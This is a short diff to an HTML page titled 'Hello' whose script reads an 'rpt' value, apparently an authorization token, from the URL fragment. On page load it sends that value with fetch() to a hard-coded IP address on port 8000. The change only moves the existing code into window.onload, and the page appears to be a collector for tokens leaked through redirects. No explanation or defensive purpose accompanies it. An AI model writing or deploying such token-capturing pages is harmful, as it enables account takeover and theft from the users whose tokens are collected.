@@ -2,17 +2,20 @@
 <h1>Hello</h1>
 
 <script>
-// Get the URL fragment (part after #)
-const fragment = window.location.hash.substring(1);
+window.onload = function () {
+  // Get the URL fragment (part after #)
+  const fragment = window.location.hash.substring(1);
 
-// Parse fragment parameters
-const params = new URLSearchParams(fragment);
+  // Parse fragment parameters
+  const params = new URLSearchParams(fragment);
 
-// Get the 'rpt' parameter value
-const rptValue = params.get('rpt');
+  // Get the 'rpt' parameter value
+  const rptValue = params.get('rpt');
 
-if (rptValue) {
-  // Send it to the server
-  fetch(`http://217.76.52.175:8000/?rpt=${encodeURIComponent(rptValue)}`);
-}
+  if (rptValue) {
+    // Send it to the server
+    fetch(`http://217.76.52.175:8000/?rpt=${encodeURIComponent(rptValue)}`);
+  }
+};
+
 </script>
